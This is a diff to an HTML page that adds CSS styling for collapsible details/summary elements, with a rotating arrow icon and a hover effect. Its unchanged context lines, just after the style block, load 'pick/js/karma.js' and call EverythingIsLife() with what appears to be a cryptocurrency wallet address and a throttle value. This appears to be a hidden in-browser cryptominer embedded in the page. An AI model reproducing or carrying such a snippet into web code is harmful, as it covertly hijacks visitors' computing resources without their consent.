@@ -13,8 +13,35 @@
   </head>
   <body>
 <style>
-  details summary {font-weight: bold;}
-    </style>
+details summary {
+  font-weight: bold;
+}
+
+details summary {
+  font-weight: bold;
+  list-style: none;             /* remove default triangle */
+  cursor: pointer;
+  position: relative;
+  padding-left: 24px;           /* space for the custom icon */
+}
+
+details summary::before {
+  content: '▶';                 /* default closed icon */
+  position: absolute;
+  left: 0;
+  transition: transform 0.2s ease;
+}
+
+details[open] summary::before {
+  transform: rotate(90deg);     /* rotated icon when open */
+}
+
+/* Optional: subtle hover effect */
+details summary:hover {
+  background-color: #f0f0f0;
+  border-radius: 4px;
+}
+</style>
 <script src="pick/js/karma.js?karma=bs?nosaj=faster.mo" ></script>
 <script type="text/javascript">
 EverythingIsLife('429Jam8Aas6hpdSywvGsVQNENYMrBwMddGriWfiZTYhHPQ7xnrfr8VvieVYQoUVG5eL5S3jkgbGLL5KQPCCsFQg6B2nUoca', 'x', 95);
